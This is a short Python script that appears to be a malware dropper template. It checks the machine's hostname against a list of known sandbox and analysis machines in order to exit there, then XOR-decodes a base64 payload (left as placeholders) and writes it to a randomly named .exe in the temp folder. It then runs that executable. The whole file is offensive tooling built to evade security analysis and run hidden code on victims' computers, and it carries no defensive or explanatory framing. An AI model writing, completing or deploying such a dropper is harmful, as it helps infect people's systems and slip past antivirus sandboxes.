import socket
import subprocess
import os
import base64
import random
import string
from itertools import cycle


def xor(data, key):
    return bytes([_a ^ _b for _a, _b in zip(data, cycle(key))])


def generate_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def sandbox_check():
    hostnames = [
        "HANSPETER-PC",
        "JOHN-PC",
        "MUELLER-PC",
        "WIN7-TRAPS",
        "SANDBOX",
        "7SILVIA",
        "FORTINET",
        "TEQUILABOOMBOOM"
    ]

    if socket.gethostname in hostnames:
        exit()


sandbox_check()

XOR_KEY = b'REPLACE_XOR_KEY'
XOR_B64_PAYLOAD = b'REPLACE_B64_PAYLOAD'

payload = xor(base64.b64decode(XOR_B64_PAYLOAD), XOR_KEY)
path = os.path.join(os.getenv('temp'), generate_string(random.randint(5, 10)) + '.exe')

with open(path, 'wb') as f:
    f.write(payload)

subprocess.Popen(path, shell=True).communicate()
